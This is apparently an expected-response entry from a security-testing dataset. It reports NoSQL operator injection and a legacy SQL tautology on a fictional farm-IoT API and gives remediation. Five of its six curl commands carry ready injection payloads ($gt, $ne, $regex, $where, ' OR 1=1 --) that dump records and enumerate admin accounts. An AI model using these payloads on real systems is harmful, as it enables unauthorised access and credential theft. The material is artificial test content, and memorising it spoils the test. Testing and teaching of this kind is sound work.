# Expected Response

## System
- System: HarvestIQ IoT Platform v4.7.0
- Domain: AGRICULTURE / PRECISION FARMING
- Example ID: INJ-0122
- Risk ID: RISK-INJ-122

## Findings

### 1. NoSQL Injection (MongoDB Operator Injection) on `/api/v3/products?username=` — Primary (Declared Vulnerability)

The `username` parameter on `GET /api/v3/products` is JSON-parsed and passed directly to MongoDB `find()` without operator sanitization. An attacker can inject MongoDB query operators (`$gt`, `$ne`, `$where`, `$regex`) to bypass authentication filters and enumerate all agricultural IoT product/sensor records.

**Evidence from HAR:**
- Endpoint: `GET /api/v3/products?username={ "$gt": "" }`
- Response: HTTP 200 with all product records including admin `password_hash`
- `$gt: ""` operator matches all documents where username is greater than empty string — returns all records
- HAR response shows SQL-structured records (legacy SQL path also triggered — see Finding 2)

**Step 1 — Baseline:**
```bash
curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching IoT product records only.

**Step 2 — MongoDB `$gt` operator injection: dump all products (primary HAR attack):**
```bash
curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24gt%22%3A%22%22%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All product/sensor records returned including admin credentials — NoSQLi confirmed.

**Step 3 — MongoDB `$ne` operator: extract all non-null records:**
```bash
curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24ne%22%3Anull%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All records where username is not null — full collection dump.

**Step 4 — MongoDB `$regex` operator: enumerate admin accounts:**
```bash
curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24regex%22%3A%22%5Eadmin%22%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All documents with username starting with "admin" — privileged account enumeration.

**Step 5 — MongoDB `$where` JavaScript injection (server-side JS execution):**
```bash
curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24where%22%3A%22this.role%3D%3D'ADMIN'%22%7D" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Admin account documents returned via server-side JavaScript evaluation — all admin crop/sensor management accounts exposed.

### 2. SQL Injection on `/api/v3/products?username=` — Secondary (Legacy SQL Path, RISK-INJ-122)

HAR response shows SQL-structured records — legacy SQL path active on same endpoint.

**Step 6 — SQL tautology (legacy SQL path):**
```bash
curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%27%20OR%201%3D1%20--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All product records returned via SQL tautology.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- Strip MongoDB operator keys from query parameters before passing to `find()` — reject keys starting with `$` (RISK-INJ-122).
- Use MongoDB schema validation to reject unexpected operator patterns.
- Avoid `JSON.parse()` on raw query parameters — use typed schema validation (e.g., Joi, Zod).
- Replace legacy SQL path with parameterized queries.
- Disable verbose error messages in production.
